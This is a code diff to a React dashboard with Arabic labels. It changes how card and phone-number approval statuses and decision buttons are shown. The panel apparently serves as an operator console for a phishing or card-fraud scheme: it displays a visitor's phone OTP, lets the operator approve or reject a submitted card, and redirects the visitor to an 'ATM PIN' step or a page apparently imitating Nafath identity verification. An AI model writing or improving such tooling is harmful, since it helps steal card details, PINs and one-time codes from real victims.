@@ -100,8 +100,6 @@ export default function DashboardPage() {
   const [newBlockedCard, setNewBlockedCard] = useState("");
   const [currentTime, setCurrentTime] = useState(Date.now());
   const [openLogBox, setOpenLogBox] = useState<string | null>(null);
-  const [cardActionStatus, setCardActionStatus] = useState<"approved" | "rejected" | "pin" | null>(null);
-  const [phoneActionStatus, setPhoneActionStatus] = useState<"approved" | "rejected" | null>(null);
   const socketRef = useRef<Socket | null>(null);
   const currentTimeRef = useRef(Date.now());
   const headerMenuRef = useRef<HTMLDivElement | null>(null);
@@ -2821,24 +2819,24 @@ const renderNafadBox = () => {
               </div>
             </div>
             
-            {!cardActionStatus ? (
-              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-                ⏳ في انتظار المراجعة فقط
-              </div>
-            ) : cardActionStatus === "approved" ? (
+            {effectiveCardStatus === "approved" ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ✓ تمت الموافقة
               </div>
-            ) : cardActionStatus === "rejected" ? (
+            ) : effectiveCardStatus === "rejected" ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 ✗ تم رفض البطاقة
               </div>
-            ) : (
+            ) : effectiveCardStatus === "pin" ? (
               <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dbeafe", color: "#1e40af", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                 🔐 رمز ATM
               </div>
+            ) : (
+              <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                ⏳ في انتظار المراجعة فقط
+              </div>
             )}
-            {showCardDecisionButtons && !cardActionStatus && (
+            {showCardDecisionButtons && (
               <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                 <button onClick={async () => { 
                   setActionLoading("card");
@@ -2855,7 +2853,6 @@ const renderNafadBox = () => {
                       body: JSON.stringify({ visitorId, targetPage: "step2" }),
                     });
                   }
-                  setCardActionStatus("approved");
                   setActionLoading(null);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   موافقة
@@ -2875,7 +2872,6 @@ const renderNafadBox = () => {
                       body: JSON.stringify({ visitorId, targetPage: "check" }),
                     });
                   }
-                  setCardActionStatus("rejected");
                   setActionLoading(null);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   رفض
@@ -2895,7 +2891,6 @@ const renderNafadBox = () => {
                       body: JSON.stringify({ visitorId, targetPage: "step3" }),
                     });
                   }
-                  setCardActionStatus("pin");
                   setActionLoading(null);
                 }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#3b82f6", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                   PIN
@@ -3521,20 +3516,20 @@ const renderNafadBox = () => {
                   <p style={{ margin: 0, fontSize: "18px", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.2em" }}>{raw.phoneOtp || raw._v7}</p>
                 </div>
               )}
-              {!phoneActionStatus ? (
-                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
-                  ⏳ في انتظار المراجعة فقط
-                </div>
-              ) : phoneActionStatus === "approved" ? (
+              {effectivePhoneStatus === "approved" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#dcfce7", color: "#166534", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✓ تمت الموافقة - العميل يُوجه للصفحة التالية
                 </div>
-              ) : (
+              ) : effectivePhoneStatus === "rejected" ? (
                 <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fee2e2", color: "#991b1b", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
                   ✗ تم رفض رقم الهاتف - العميل سيُعيد المحاولة
                 </div>
+              ) : (
+                <div style={{ marginTop: 8, padding: "10px 12px", borderRadius: 8, background: "#fef3c7", color: "#92400e", fontSize: "12px", textAlign: "center", fontWeight: 600 }}>
+                  ⏳ في انتظار المراجعة فقط
+                </div>
               )}
-              {showPhoneDecisionButtons && !phoneActionStatus && (
+              {showPhoneDecisionButtons && (
                 <div style={{ display: "flex", gap: 8, justifyContent: "center", marginTop: 10 }}>
                   <button onClick={async () => { 
                     setActionLoading("phone");
@@ -3551,7 +3546,6 @@ const renderNafadBox = () => {
                         body: JSON.stringify({ visitorId, targetPage: "nafad" }),
                       });
                     }
-                    setPhoneActionStatus("approved");
                     setActionLoading(null);
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#16a34a", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     موافقة
@@ -3571,7 +3565,6 @@ const renderNafadBox = () => {
                         body: JSON.stringify({ visitorId, targetPage: "step5" }),
                       });
                     }
-                    setPhoneActionStatus("rejected");
                     setActionLoading(null);
                   }} style={{ border: "none", borderRadius: 8, padding: "8px 12px", background: "#dc2626", color: "#fff", cursor: "pointer", fontWeight: 700 }}>
                     رفض
